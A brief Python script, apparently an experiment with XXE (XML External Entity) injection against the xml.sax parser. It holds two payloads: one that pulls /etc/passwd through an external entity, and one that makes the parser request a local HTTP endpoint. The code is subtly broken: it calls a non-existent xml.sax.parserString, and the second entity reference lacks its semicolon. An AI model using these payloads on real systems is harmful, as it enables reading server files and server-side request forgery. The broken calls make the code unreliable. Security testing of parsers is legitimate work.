# coding=utf-8
import xml.sax

x = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xdsec [
<!ELEMENT methodname ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<methodcall>
<methodname>&xxe;</methodname>
</methodcall>
""" 

x1 = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xdsec [
<!ELEMENT methodname ANY >
<!ENTITY xxe SYSTEM "http://127.0.0.1:8005/xml.test" >]>
<methodcall>
<methodname>&xxe</methodname>
</methodcall>
"""

class MyContentHandler(xml.sax.ContentHandler):
	def __init__(self):
		xml.sax.ContentHandler.__init__(self)


	def startElement(self, name, attrs):
		self.chars = ""


	def endElement(self, name):
		print(name, self.chars)


	def characters(self,content):
		self.chars += content


parser = MyContentHandler()
print(xml.sax.parserString(x, parser))
print(xml.sax.parserString(x1,parser))

